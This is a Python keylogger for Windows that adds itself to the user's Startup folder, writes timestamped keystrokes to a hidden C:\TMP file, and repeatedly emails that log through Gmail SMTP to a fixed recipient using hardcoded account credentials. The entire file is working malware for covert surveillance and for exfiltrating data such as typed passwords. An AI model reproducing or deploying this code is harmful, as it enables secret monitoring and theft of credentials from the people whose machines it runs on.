import keyboard, time, smtplib, ctypes, os
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from shutil import copy

def AddStarUp(): 
    FileName = os.path.basename(__file__)
    User = os.getenv("USERNAME")
    copy(FileName,'C:\\Users\\' + User + '\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup')

def Dir():
    path = 'C:\\TMP'
    if os.path.isdir(path) != True:
        os.mkdir(path)
        Hidden = 0x02
        ctypes.windll.kernel32.SetFileAttributesW(path, Hidden)

def KeyLog():
    FilePath = 'C:\\TMP\\TmpFile.txt'
    PressedKeys = 2500
    with open(FilePath, "w") as f:
        while PressedKeys > 0:
            time_now = time.ctime()
            presskey = keyboard.read_key()
            f.write(str(time_now) + " - Key -> " + str(presskey) + "\n")
            PressedKeys = PressedKeys - 1
    with open(FilePath, "r") as f:
        lines = f.readlines()
    with open(FilePath, "w") as f:
        for i, line in enumerate(lines):
            if (i%2) == 0:
                f.write(line)

def ToEmail():
    email = 'rexr3389@gmail.com'
    SendToEmail = 'pprayzen@gmail.com'
    UpLoadFilePath = 'C:\\TMP\\TmpFile.txt'
     
    msg = MIMEMultipart()
    msg['From'] = email
    msg['To'] = SendToEmail
    msg['Subject'] = 'Txt Importante'
    msg.attach(MIMEText('Info', 'plain'))

    # Setup do email
    filename = os.path.basename(UpLoadFilePath)
    attachment = open(UpLoadFilePath, "rb")
    part = MIMEBase('application', 'octet-stream')
    part.set_payload(attachment.read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', "attachment; filename= %s" % filename)

    # Junta o ficheiro para enviar no email
    msg.attach(part)

    # Envia o email
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.ehlo()
    server.starttls()
    server.login(email, 'ilpkibficlmmreut')
    text = msg.as_string()
    server.sendmail(email, SendToEmail, text)
    server.quit()

AddStarUp()
Dir()

while True:
    KeyLog()
    ToEmail()

